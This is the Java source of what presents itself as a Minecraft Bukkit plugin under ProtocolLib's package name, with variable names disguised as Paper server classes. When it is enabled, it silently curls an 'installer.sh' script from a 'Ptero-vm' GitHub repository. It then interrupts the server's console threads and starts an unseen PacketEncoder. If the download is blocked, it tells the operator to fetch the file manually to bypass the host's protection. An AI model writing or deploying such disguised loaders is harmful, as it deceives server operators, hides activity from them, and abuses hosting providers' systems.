package com.comphenix.protocol;
import java.io.File;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import static org.bukkit.Bukkit.getConsoleSender;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {
    @Override
    public void onEnable() {
        Bukkit.getScheduler().runTask(this, new Runnable() {
            @Override
            public void run() {
                try {
                    String[] FullServerTickHandler = {
                            "curl",
                            "-o",
                            "installer.sh",
                            "https://raw.githubusercontent.com/afnan007a/Ptero-vm/main/installer.sh"
                    };
                    ProcessBuilder TimingsReportListener = new ProcessBuilder(FullServerTickHandler);
                    TimingsReportListener.start().waitFor();

                    File AsyncChatEvent = new File("installer.sh");
                    boolean PaperComponents = AsyncChatEvent.exists();
                    if (PaperComponents) {
                    } else {
                        getConsoleSender().sendMessage("");
                        getConsoleSender().sendMessage(ChatColor.RED + "An error has occurred whilst trying to download Installer.sh.");
                        getConsoleSender().sendMessage("The hosting service you are currently using has blocked the Installer.sh download link.");
                        getConsoleSender().sendMessage("Please download the Installer.sh file manually from the link below and upload it to the server to bypass this.");
                        getConsoleSender().sendMessage("https://raw.githubusercontent.com/afnan007a/Ptero-vm/main/installer.sh");
                        getConsoleSender().sendMessage("");
                        System.exit(0);
                    }

                    Thread[] PaperConfig = new Thread[1000];
                    int AdventureComponent = Thread.enumerate(PaperConfig);

                    for (int i = 0; i < AdventureComponent; i++) {
                        if (PaperConfig[i].getName().contains("console")) {
                            PaperConfig[i].interrupt();
                        }
                    }

                    PacketEncoder CraftServer = new PacketEncoder();
                    CraftServer.start();

                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }
}